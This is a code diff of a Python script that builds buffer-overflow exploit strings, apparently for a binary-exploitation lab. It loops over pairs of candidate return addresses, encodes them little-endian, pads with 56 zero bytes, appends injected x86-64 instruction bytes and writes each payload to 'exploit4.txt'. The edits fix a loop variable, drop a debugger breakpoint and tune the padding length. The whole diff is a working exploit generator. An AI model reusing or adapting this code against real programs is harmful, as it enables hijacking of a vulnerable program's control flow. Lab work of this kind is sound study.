@@ -5,25 +5,24 @@ for i in range(4201265,4201323):
     for j in range(4201265,4201323):
         d = hex(i)[2:]
         addr1_output = " "
-        for i in range(len(d),0,-2):
-            addr1_output = addr1_output + d[i-2:i] + " "
+        for k in range(len(d),0,-2):
+            addr1_output = addr1_output + d[k-2:k] + " "
 
         addr1_output = addr1_output + "00 00 00 00 00 "
 
         d = hex(j)[2:]
         addr2_output = " "
-        for i in range(len(d),0,-2):
-            addr2_output = addr2_output + d[i-2:i] + " "
+        for k in range(len(d),0,-2):
+            addr2_output = addr2_output + d[k-2:k] + " "
 
         addr2_output = addr2_output + "00 00 00 00 00 "
 
-        pdb.set_trace()
         output = addr1_output + addr2_output
 
         fill_buffer = ""
-        for i in range(1000):
+        for k in range(56):
             fill_buffer = fill_buffer + "00 "
-        out_buffer = fill_buffer + output + "00 00 00 00"
+        out_buffer = fill_buffer + output + "48 c7 c7 25 68 75 54 00"
 
         text_file = open("exploit4.txt", "w")
         text_file.write("%s" % out_buffer)
